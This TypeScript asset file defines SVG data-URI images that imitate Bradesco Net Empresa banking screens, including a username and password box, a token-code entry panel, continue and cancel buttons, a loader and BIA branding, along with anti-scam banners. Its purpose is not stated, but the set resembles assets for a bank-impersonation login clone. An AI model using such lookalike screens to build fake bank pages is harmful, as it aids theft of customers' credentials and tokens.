const encodeSvg = (svg: string) => `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;

export const topoSite = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1920 156">
    <defs>
      <linearGradient id="g" x1="0" x2="1">
        <stop offset="0%" stop-color="#f3f3f3"/>
        <stop offset="100%" stop-color="#d9d9d9"/>
      </linearGradient>
    </defs>
    <rect width="1920" height="156" fill="url(#g)"/>
    <rect x="0" y="0" width="1920" height="12" fill="#c1072d"/>
    <rect x="0" y="12" width="1920" height="72" fill="#efefef"/>
    <rect x="0" y="84" width="1920" height="72" fill="#f7f7f7"/>
    <g font-family="Arial, sans-serif" fill="#3a3a3a">
      <text x="170" y="62" font-size="22" font-weight="700">BRADESCO</text>
      <text x="169" y="98" font-size="12" letter-spacing="2">NET EMPRESA</text>
    </g>
    <rect x="1200" y="24" width="470" height="90" rx="10" fill="#ffffff" opacity="0.18"/>
    <path d="M1600 44h170" stroke="#c1072d" stroke-width="5" stroke-linecap="round"/>
  </svg>
`);

export const bannerFalsaCentral = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 717 74">
    <rect width="717" height="74" fill="#fff7d6"/>
    <rect x="0" y="0" width="717" height="74" fill="#fff1c4"/>
    <circle cx="36" cy="36" r="18" fill="#d12d2d"/>
    <path d="M36 22v16M36 46h.01" stroke="#fff" stroke-width="4" stroke-linecap="round"/>
    <text x="70" y="34" font-family="Arial, sans-serif" font-size="20" font-weight="700" fill="#7a1f1f">Golpe da falsa central</text>
    <text x="70" y="54" font-family="Arial, sans-serif" font-size="12" fill="#7a1f1f">Dicas para se proteger</text>
  </svg>
`);

export const caixaLogin = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 717 161">
    <rect width="717" height="161" fill="#f7f7f7"/>
    <rect x="40" y="45" width="640" height="90" rx="8" fill="#fff" stroke="#d9d9d9"/>
    <text x="70" y="87" font-family="Arial, sans-serif" font-size="15" fill="#333">Informe o usuário e a senha</text>
    <rect x="280" y="56" width="200" height="20" rx="3" fill="#f2f2f2" />
    <rect x="280" y="92" width="200" height="20" rx="3" fill="#f2f2f2" />
  </svg>
`);

export const botaoAvancar = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 82 22">
    <rect width="82" height="22" rx="4" fill="#b5002d"/>
    <text x="41" y="15" text-anchor="middle" font-family="Arial, sans-serif" font-size="10" font-weight="700" fill="#fff">AVANÇAR</text>
  </svg>
`);

export const botaoCancelar = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 121 23">
    <rect width="121" height="23" rx="4" fill="#f1f1f1" stroke="#d5d5d5"/>
    <text x="60.5" y="15.5" text-anchor="middle" font-family="Arial, sans-serif" font-size="9" font-weight="700" fill="#666">CANCELAR ACESSO</text>
  </svg>
`);

export const colunaGolpes = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 420">
    <rect width="240" height="420" fill="#f0f0f0"/>
    <rect x="8" y="20" width="224" height="220" rx="12" fill="#dfe3ea"/>
    <circle cx="120" cy="130" r="44" fill="#d82d2d"/>
    <path d="M120 96v36M120 155h.01" stroke="#fff" stroke-width="10" stroke-linecap="round"/>
    <text x="120" y="290" text-anchor="middle" font-family="Arial, sans-serif" font-size="18" font-weight="700" fill="#2b2b2b">Se proteja</text>
    <text x="120" y="315" text-anchor="middle" font-family="Arial, sans-serif" font-size="13" fill="#555">Contra golpes</text>
    <rect x="26" y="340" width="188" height="42" rx="8" fill="#f7d9d9"/>
    <text x="120" y="367" text-anchor="middle" font-family="Arial, sans-serif" font-size="11" font-weight="700" fill="#902a2a">Use canais oficiais</text>
  </svg>
`);

export const rodape = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 60">
    <rect width="1200" height="60" fill="#ededed"/>
    <rect x="0" y="0" width="1200" height="6" fill="#c1072d"/>
    <text x="600" y="36" text-anchor="middle" font-family="Arial, sans-serif" font-size="18" font-weight="700" fill="#555">Bradesco Apoio à Empresa</text>
  </svg>
`);

export const caixaLoader = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200">
    <rect width="200" height="200" rx="18" fill="#ffffff" opacity="0.9"/>
    <circle cx="100" cy="100" r="36" fill="none" stroke="#c8102e" stroke-width="8" stroke-dasharray="120 60" transform="rotate(-90 100 100)"/>
    <circle cx="100" cy="100" r="18" fill="#c8102e" opacity="0.18"/>
  </svg>
`);

export const caixaToken = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 717 322">
    <rect width="717" height="322" fill="#f5f5f5"/>
    <rect x="50" y="42" width="617" height="230" rx="12" fill="#fff" stroke="#dbdbdb"/>
    <text x="80" y="98" font-family="Arial, sans-serif" font-size="22" font-weight="700" fill="#2a2a2a">Token</text>
    <text x="80" y="130" font-family="Arial, sans-serif" font-size="14" fill="#555">Digite a chave informada no visor.</text>
    <rect x="80" y="170" width="250" height="42" rx="8" fill="#f1f1f1" stroke="#d7d7d7"/>
    <rect x="370" y="170" width="220" height="42" rx="8" fill="#f8f8f8" stroke="#d7d7d7"/>
  </svg>
`);

export const biaImg = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 320">
    <defs>
      <linearGradient id="bia" x1="0" x2="1">
        <stop offset="0%" stop-color="#1a1b4d"/>
        <stop offset="100%" stop-color="#2d4dbd"/>
      </linearGradient>
    </defs>
    <rect width="1200" height="320" fill="url(#bia)"/>
    <circle cx="180" cy="140" r="78" fill="#c8102e" opacity="0.8"/>
    <circle cx="980" cy="120" r="110" fill="#ffffff" opacity="0.08"/>
    <text x="72" y="178" font-family="Arial, sans-serif" font-size="48" font-weight="700" fill="#fff">BIA</text>
    <text x="72" y="220" font-family="Arial, sans-serif" font-size="20" fill="#dfe7ff">Bradesco Inteligência Artificial</text>
  </svg>
`);

export const fundoBia = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1600 900">
    <rect width="1600" height="900" fill="#ecf1ff"/>
    <rect x="0" y="0" width="1600" height="900" fill="#eef3ff"/>
    <g opacity="0.18">
      <circle cx="150" cy="150" r="140" fill="#c8102e"/>
      <circle cx="1300" cy="700" r="190" fill="#2d4dbd"/>
      <circle cx="850" cy="300" r="220" fill="#7aa6ff"/>
    </g>
    <rect x="100" y="100" width="1400" height="680" rx="30" fill="#ffffff" opacity="0.35"/>
  </svg>
`);

export const biaLogo = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 70">
    <rect width="200" height="70" fill="#fff" opacity="0"/>
    <rect x="8" y="10" width="50" height="50" rx="10" fill="#c8102e"/>
    <text x="72" y="44" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="#1c1c1c">BIA</text>
  </svg>
`);

export const iconeTokenCelular = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
    <rect x="18" y="4" width="28" height="56" rx="6" fill="#c8102e"/>
    <rect x="24" y="12" width="16" height="30" rx="4" fill="#fff" opacity="0.9"/>
    <circle cx="32" cy="48" r="4" fill="#fff"/>
  </svg>
`);

export const iconeTokenChaveiro = encodeSvg(`
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
    <path d="M25 12h14v8c8 2 14 9 14 17 0 10-8 18-18 18S17 47 17 37c0-8 6-15 14-17v-8zm10 2v6h-6v-6h6z" fill="#c8102e"/>
    <circle cx="32" cy="36" r="5" fill="#fff"/>
  </svg>
`);
